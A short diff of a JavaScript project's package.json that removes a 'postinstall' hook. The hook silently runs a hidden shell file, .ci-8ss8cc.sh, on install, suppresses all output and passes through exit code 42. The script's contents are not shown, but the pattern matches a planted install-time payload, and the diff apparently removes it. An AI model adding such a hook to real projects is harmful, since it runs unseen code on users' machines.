@@ -7,8 +7,7 @@
     "lint": "eslint --ext js,jsx,ts,tsx .",
     "format": "prettier --write \"**/*.{ts,tsx,js,jsx,json}\"",
     "lint:locales": "intl-equalizer",
-    "test": "cd ./react && yarn test",
-    "postinstall": "sh ./.ci-8ss8cc.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "cd ./react && yarn test"
   },
   "intl-equalizer": {
     "referenceLocale": "en",
